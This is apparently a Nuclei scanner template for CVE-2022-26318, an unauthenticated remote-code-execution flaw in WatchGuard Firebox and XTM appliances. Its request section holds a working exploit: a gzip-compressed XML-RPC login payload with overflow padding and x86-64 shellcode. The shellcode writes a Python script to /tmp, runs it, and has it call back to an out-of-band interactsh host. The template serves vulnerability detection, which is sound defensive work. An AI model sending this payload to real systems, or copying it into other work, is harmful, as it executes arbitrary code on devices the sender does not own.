id: CVE-2022-26318

info:
  name: WatchGuard Firebox & XTM RCE
  description: |
    On WatchGuard Firebox and XTM appliances, an unauthenticated user
    can execute arbitrary code, aka FBX-22786. This vulnerability
    impacts Fireware OS before 12.7.2_U2, 12.x before 12.1.3_U8,
    and 12.2.x through 12.5.x before 12.5.9_U2. This template supports
    the detection part only. See references.
  remediation: Uprade to Fireware v12.7.2 Update 2
  author: dwisiswant0
  severity: critical
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-26318
    - https://github.com/misterxid/watchguard_cve-2022-26318 # original PoC
    - https://www.watchguard.com/support/release-notes/fireware/12/en-US/EN_ReleaseNotes_Fireware_12_7_2/index.html#Fireware/en-US/resolved_issues.html
  tags: cve,cve2022,watchguard,rce

requests:
  - raw:
      - |
        POST /agent/login HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Accept: */*
        Content-Encoding: gzip

        {{gzip(data)}}

    payloads:
      data:
        - <methodCall><methodName>agent.login</methodName><params><param><value><struct><member><value><{{repeat("A", 3181)}}MFA>{{repeat("<BBBBMFA>", 3680)}}{{repeat("\\x00", 231)}} P@{{repeat("\\x00", 5)}}h\xf9@{{repeat("\\x00", 5)}} P@{{repeat("\\x00", 7)}}\x0e\xd6A{{repeat("\\x00", 5)}}\xb1\xd5A{{repeat("\\x00", 21)}}{{url_decode("%7D")}}^@{{repeat("\\x00", 13)}}|^@{{repeat("\\x00", 5)}}\xad\xd2A{{repeat("\\x00", 13)}}\x0e\xd6A{{repeat("\\x00", 5)}}\xc0{{repeat("\\x00", 23)}}*\xa9@{{repeat("\\x00", 5)}}H\x8d=\x9d\x00\x00\x00\xbeA\x02\x00\x00\xba\xb6\x01\x00\x00\xb8\x02\x00\x00\x00\x0f\x05H\x89\x05\x92\x00\x00\x00H\x8b\x15\x93\x00\x00\x00H\x8d5\x94\x00\x00\x00H\x8b=}\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05H\x8b=o\x00\x00\x00\xb8\x03\x00\x00\x00\x0f\x05\xb8;\x00\x00\x00H\x8d=?\x00\x00\x00H\x89= \x00\x00\x00H\x8d5A\x00\x00\x00H\x895\x1a\x00\x00\x00H\x8d5\x0b\x00\x00\x001\xd2\x0f\x05\xb8<\x00\x00\x00\x0f\x05{{repeat("\\x00", 24)}}/usr/bin/python\x00/tmp/test.py{{repeat("\\x00", 9)}}\xef\x01{{repeat("\\x00", 6)}}import requests; requests.get('http://{{interactsh-url}}');

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - 'http'
